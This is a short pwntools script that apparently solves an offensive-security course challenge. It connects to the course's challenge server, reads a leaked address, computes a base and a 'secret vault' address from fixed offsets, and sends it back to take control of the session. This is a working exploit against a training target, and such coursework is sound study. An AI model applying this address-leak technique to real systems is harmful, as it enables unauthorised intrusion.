from pwn import *

conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1234)

print(conn.recvuntil(b'Please input your NetID (something like abc123): ').decode())
conn.sendline(b'vc2499')

print(conn.recvuntil(b'I found this fake vault at: ').decode())
fake_vault_addr = u64(conn.recvn(6).ljust(8, b'\x00'))

base_addr = fake_vault_addr - 0x4030
secret_vault_addr = base_addr + 0x4038

conn.send(p64(secret_vault_addr)[:6])
conn.interactive()